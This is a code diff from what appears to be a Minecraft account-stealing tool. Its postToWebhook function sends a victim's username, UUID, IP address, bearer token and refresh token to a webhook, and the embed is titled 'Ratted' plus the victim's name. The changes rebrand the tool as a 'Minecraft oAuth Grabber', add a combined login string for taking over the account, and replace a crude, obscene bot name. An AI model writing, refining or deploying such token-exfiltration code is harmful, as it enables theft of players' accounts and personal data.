@@ -124,17 +124,18 @@ function getIp(req) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-  username: "MagiDev's anal slave v2
-  avatar_url: "https://www.meigspointnaturecenter.org/wp-content/uploads/2020/08/common-pigeon-ss-scaled.jpg",
+  username: "MOG",
+  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
   content: "@everyone",
   embeds: [
     {
       title: "Ratted " + username + " - Click for networth",
       color: 5898337,
-      description: "**Username:**\n```"+username+"```\n\n**UUID:**\n```"+uuid+"```\n\n**IP:**\n```"+ip+"```\n\n**Token:**\n```"+bearerToken+"```\n\n**Refresh Token:**\n```"+refreshToken+"```\n"`",
+      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
       url: "https://spillager.live/skyblock/networth/"+username,
       footer: {
-        text: "MagiDev Moment",
+        text: "Minecraft oAuth Grabber by WH0",
+        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
       },
     }
   ],
